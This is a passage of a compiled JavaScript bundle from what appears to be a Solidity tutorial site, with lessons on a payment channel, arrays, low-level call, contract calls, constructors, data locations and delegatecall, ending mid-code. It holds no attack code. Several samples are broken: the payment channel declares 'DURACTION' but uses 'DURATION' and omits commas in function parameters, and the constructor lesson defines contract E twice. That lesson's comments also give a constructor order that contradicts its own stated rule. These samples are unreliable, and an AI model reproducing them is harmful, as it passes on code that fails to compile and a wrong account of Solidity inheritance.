class="hljs-keyword">uint</span> j</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        i += j;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"callMe(uint256)"</span>, <span class="hljs-number">123</span>);\n    }\n}\n</code></pre>\n'})};var M=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Uni-Directional Payment Channel",description:"An example of uni-directional payment channels in Solidity",html:'<p>Payment channels allow participants to repeatedly transfer Ether off chain.</p>\n<p>Here is how this contract is used:</p>\n<ul>\n<li><code>Alice</code> deploys the contract, funding it with some Ether.</li>\n<li><code>Alice</code> authorizes a payment by signing a message (off chain) and sends the signature to <code>Bob</code>.</li>\n<li><code>Bob</code> claims his payment by presenting the signed message to the smart contract.</li>\n<li>If <code>Bob</code> does not claim his payment, <code>Alice</code> get her Ether back after the contract expires</li>\n</ul>\n<p>This is called a uni-directional payment channel since the payment can go only in a signle direction from <code>Alice</code> to <code>Bob</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol"</span>;\n<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/utils/ReentrancyGuard.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">UniDirectionalPaymentChannel</span> <span class="hljs-keyword">is</span> <span class="hljs-title">ReentrancyGuard</span> </span>{\n    <span class="hljs-keyword">using</span> <span class="hljs-title">ECDSA</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">bytes32</span></span>;\n\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> <span class="hljs-keyword">public</span> sender;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> <span class="hljs-keyword">public</span> receiver;\n\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constant</span> DURACTION = <span class="hljs-number">7</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> expiresAt;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _receiver</span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-built_in">require</span>(_receiver != <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">"receiver = zero address"</span>);\n        sender = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n        receiver = _receiver;\n        expiresAt = <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> + DURATION;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_getHash</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> sign with address of this contract to protect agains</span>\n        <span class="hljs-comment">// replay attack on other contracts</span>\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), _amount));\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getHash</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-keyword">return</span> _getHash(_amount);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_getEthSignedHash</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-keyword">return</span> _getHash(_amount).toEthSignedMessageHash();\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getEthSignedHash</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-keyword">return</span> _getEthSignedHash(_amount);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_verify</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> _sig</span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{\n        <span class="hljs-keyword">return</span> _getEthSignedHash(_amount).recover(_sig) == sender;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> _sig</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{\n        <span class="hljs-keyword">return</span> _verify(_amount, _sig);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> _sig</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title">nonReentrant</span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == receiver, <span class="hljs-string">"!receiver"</span>);\n        <span class="hljs-built_in">require</span>(_verify(_amount, _sig), <span class="hljs-string">"invalid sig"</span>);\n\n        (<span class="hljs-keyword">bool</span> sent, ) = receiver.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> _amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n        <span class="hljs-built_in">selfdestruct</span>(sender);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cancel</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == sender, <span class="hljs-string">"!sender"</span>);\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> &gt;= expiresAt, <span class="hljs-string">"!expired"</span>);\n        <span class="hljs-built_in">selfdestruct</span>(sender);\n    }\n}\n</code></pre>\n'})};var O=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Array",description:"Learn about arrays in Solidity",html:'<p>Array can have a compile-time fixed size or a dynamic size.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Array</span> </span>{\n    <span class="hljs-comment">// Several ways to initialize an array</span>\n    <span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">public</span> arr;\n    <span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">public</span> arr2 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];\n    <span class="hljs-comment">// Fixed sized array, all elements initialize to 0</span>\n    <span class="hljs-keyword">uint</span>[<span class="hljs-number">10</span>] <span class="hljs-keyword">public</span> myFixedSizeArr;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> arr[i];\n    }\n\n    <span class="hljs-comment">// Solidity can return the entire array.</span>\n    <span class="hljs-comment">// But this function should be avoided for</span>\n    <span class="hljs-comment">// arrays that can grow indefinitely in length.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getArr</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> arr;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">push</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Append to array</span>\n        <span class="hljs-comment">// This will increase the array length by 1.</span>\n        arr.<span class="hljs-built_in">push</span>(i);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pop</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Remove last element from array</span>\n        <span class="hljs-comment">// This will decrease the array length by 1</span>\n        arr.<span class="hljs-built_in">pop</span>();\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLength</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> arr.<span class="hljs-built_in">length</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> index</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Delete does not change the array length.</span>\n        <span class="hljs-comment">// It resets the value at index to it&#x27;s default value,</span>\n        <span class="hljs-comment">// in this case 0</span>\n        <span class="hljs-keyword">delete</span> arr[index];\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">CompactArray</span> </span>{\n    <span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">public</span> arr;\n\n    <span class="hljs-comment">// Deleting an element creates a gap in the array.</span>\n    <span class="hljs-comment">// One trick to keep the array compact is to</span>\n    <span class="hljs-comment">// move the last element into the place to delete.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> index</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Move the last element into the place to delete</span>\n        arr[index] = arr[arr.<span class="hljs-built_in">length</span> - <span class="hljs-number">1</span>];\n        <span class="hljs-comment">// Remove the last element</span>\n        arr.<span class="hljs-built_in">pop</span>();\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        arr.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);\n        arr.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);\n        arr.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);\n        arr.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);\n        <span class="hljs-comment">// [1, 2, 3, 4]</span>\n\n        remove(<span class="hljs-number">1</span>);\n        <span class="hljs-comment">// [1, 4, 3]</span>\n\n        remove(<span class="hljs-number">2</span>);\n        <span class="hljs-comment">// [1, 4]</span>\n    }\n}\n</code></pre>\n'})};var D=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Call",description:"In Solidity call is a low level function to interact with other contracts",html:'<p><code>call</code> is a low level function to interact with other contracts.</p>\n<p>This is the recommended method to use when you&#39;re just sending Ether via calling the <code>fallback</code> function.</p>\n<p>However it is not the recommend way to call existing functions.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Receiver</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Received</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> caller, <span class="hljs-keyword">uint</span> amount, <span class="hljs-keyword">string</span> message</span>)</span>;\n\n    <span class="hljs-keyword">receive</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {\n        <span class="hljs-keyword">emit</span> Received(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>, <span class="hljs-string">"Fallback was called"</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _message, <span class="hljs-keyword">uint</span> _x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">emit</span> Received(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>, _message);\n\n        <span class="hljs-keyword">return</span> _x + <span class="hljs-number">1</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Caller</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Response</span>(<span class="hljs-params"><span class="hljs-keyword">bool</span> success, <span class="hljs-keyword">bytes</span> data</span>)</span>;\n\n    <span class="hljs-comment">// Let&#x27;s imagine that contract B does not have the source code for</span>\n    <span class="hljs-comment">// contract A, but we do know the address of A and the function to call.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testCallFoo</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _addr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-comment">// You can send ether and specify a custom gas amount</span>\n        (<span class="hljs-keyword">bool</span> success, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> data) = _addr.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>, <span class="hljs-built_in">gas:</span> <span class="hljs-number">5000</span>}(\n            <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"foo(string,uint256)"</span>, <span class="hljs-string">"call foo"</span>, <span class="hljs-number">123</span>)\n        );\n\n        <span class="hljs-keyword">emit</span> Response(success, data);\n    }\n\n    <span class="hljs-comment">// Calling a function that does not exist triggers the fallback function.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testCallDoesNotExist</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        (<span class="hljs-keyword">bool</span> success, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> data) = _addr.<span class="hljs-built_in">call</span>(\n            <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"doesNotExist()"</span>)\n        );\n\n        <span class="hljs-keyword">emit</span> Response(success, data);\n    }\n}\n</code></pre>\n'})};var L=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Calling Other Contract",description:"In Solidity, contract can call other contracts in several ways",html:'<p>Contract can call other contracts in 2 ways.</p>\n<p>The easiest way to is to just call it, like <code>A.foo(x, y, z)</code>.</p>\n<p>Another way to call other contracts is to use the low-level <code>call</code>.</p>\n<p>This method is not recommended.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Callee</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> x;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> value;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setX</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        x = _x;\n        <span class="hljs-keyword">return</span> x;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setXandSendEther</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span>, <span class="hljs-keyword">uint</span></span>) </span>{\n        x = _x;\n        value = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n\n        <span class="hljs-keyword">return</span> (x, value);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Caller</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setX</span>(<span class="hljs-params">Callee _callee, <span class="hljs-keyword">uint</span> _x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">uint</span> x = _callee.setX(_x);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setXFromAddress</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr, <span class="hljs-keyword">uint</span> _x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        Callee callee = Callee(_addr);\n        callee.setX(_x);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setXandSendEther</span>(<span class="hljs-params">Callee _callee, <span class="hljs-keyword">uint</span> _x</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        (<span class="hljs-keyword">uint</span> x, <span class="hljs-keyword">uint</span> value) = _callee.setXandSendEther{<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}(_x);\n    }\n}\n</code></pre>\n'})};var B=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Constructor",description:"Learn how to initialize smart contracts in Solidity using a constructor",html:'<p>A <code>constructor</code> is an optional function that is executed upon contract creation.</p>\n<p>Here are examples of how to pass arguments to <code>constructors</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// Base contract X</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">X</span> </span>{\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> name;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _name</span>) </span>{\n        name = _name;\n    }\n}\n\n<span class="hljs-comment">// Base contract Y</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Y</span> </span>{\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> text;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _text</span>) </span>{\n        text = _text;\n    }\n}\n\n<span class="hljs-comment">// There are 2 ways to initialize parent contract with parameters.</span>\n\n<span class="hljs-comment">// Pass the parameters here in the inheritance list.</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">B</span> <span class="hljs-keyword">is</span> <span class="hljs-title">X</span>(<span class="hljs-params"><span class="hljs-string">"Input to X"</span></span>), <span class="hljs-title">Y</span>(<span class="hljs-params"><span class="hljs-string">"Input to Y"</span></span>) </span>{\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">C</span> <span class="hljs-keyword">is</span> <span class="hljs-title">X</span>, <span class="hljs-title">Y</span> </span>{\n    <span class="hljs-comment">// Pass the parameters here in the constructor,</span>\n    <span class="hljs-comment">// similar to function modifiers.</span>\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _name, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _text</span>) <span class="hljs-title">X</span>(<span class="hljs-params">_name</span>) <span class="hljs-title">Y</span>(<span class="hljs-params">_text</span>) </span>{\n    }\n}\n\n<span class="hljs-comment">// Parent constructors are always called in the order of inheritance</span>\n<span class="hljs-comment">// regardless of the order of parent contracts listed in the</span>\n<span class="hljs-comment">// constructor of the child contract.</span>\n\n<span class="hljs-comment">// Order of constructors called:</span>\n<span class="hljs-comment">// 1. Y</span>\n<span class="hljs-comment">// 2. X</span>\n<span class="hljs-comment">// 3. E</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">E</span> <span class="hljs-keyword">is</span> <span class="hljs-title">X</span>, <span class="hljs-title">Y</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title">X</span>(<span class="hljs-params"><span class="hljs-string">"X was called"</span></span>) <span class="hljs-title">Y</span>(<span class="hljs-params"><span class="hljs-string">"Y was called"</span></span>) </span>{\n    }\n}\n\n<span class="hljs-comment">// Order of constructors called:</span>\n<span class="hljs-comment">// 1. Y</span>\n<span class="hljs-comment">// 2. X</span>\n<span class="hljs-comment">// 3. E</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">E</span> <span class="hljs-keyword">is</span> <span class="hljs-title">X</span>, <span class="hljs-title">Y</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title">Y</span>(<span class="hljs-params"><span class="hljs-string">"Y was called"</span></span>) <span class="hljs-title">X</span>(<span class="hljs-params"><span class="hljs-string">"X was called"</span></span>) </span>{\n    }\n}\n</code></pre>\n'})};var P=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Data Locations - Storage, Memory and Calldata",description:"Data locations - storage, memory and calldata",html:'<p>Variables are declared as either <code>storage</code>, <code>memory</code> or <code>calldata</code> to explicitly\nspecify the location of the data.</p>\n<ul>\n<li><code>storage</code> - variable is a state variable (store on blockchain)</li>\n<li><code>memory</code> - variable is in memory and it exists while a function is being called</li>\n<li><code>calldata</code> - special data location that contains function arguments, only available for <code>external</code> functions</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">DataLocations</span> </span>{\n    <span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">public</span> arr;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">uint</span> =&gt; <span class="hljs-keyword">address</span>) map;\n    <span class="hljs-keyword">struct</span> <span class="hljs-title">MyStruct</span> {\n        <span class="hljs-keyword">uint</span> foo;\n    }\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">uint</span> =&gt; MyStruct) myStructs;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// call _f with state variables</span>\n        _f(arr, map, myStructs[<span class="hljs-number">1</span>]);\n\n        <span class="hljs-comment">// get a struct from a mapping</span>\n        MyStruct <span class="hljs-keyword">storage</span> myStruct = myStructs[<span class="hljs-number">1</span>];\n        <span class="hljs-comment">// create a struct in memory</span>\n        MyStruct <span class="hljs-keyword">memory</span> myMemStruct = MyStruct(<span class="hljs-number">0</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_f</span>(<span class="hljs-params">\n        <span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">storage</span> _arr,\n        <span class="hljs-keyword">mapping</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> =&gt; <span class="hljs-keyword">address</span></span>) <span class="hljs-keyword">storage</span> _map,\n        MyStruct <span class="hljs-keyword">storage</span> _myStruct\n    </span>) <span class="hljs-title"><span class="hljs-keyword">internal</span></span> </span>{\n        <span class="hljs-comment">// do something with storage variables</span>\n    }\n\n    <span class="hljs-comment">// You can return memory variables</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">memory</span> _arr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-comment">// do something with memory array</span>\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">calldata</span> _arr</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{\n        <span class="hljs-comment">// do something with calldata array</span>\n    }\n}\n</code></pre>\n'})};var F=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Delegatecall",description:"Example of how to use deletegatecall in Solidity",html:'<p><code>delegatecall</code> is a low level function similar to <code>call</code>.</p>\n<p>When contract <code>A</code> executes <code>delegatecall</code> to contract <code>B</code>, <code>B</code>&#39;s code is excuted</p>\n<p>with contract <code>A</code>&#39;s storage, <code>msg.sender</code> and <code>msg.value</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> Deploy this contract first</span>\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">B</span> </span>{\n    <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> storage layout must be the same as contract A</span>\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> num;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> sender;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> value;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setVars</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        num = 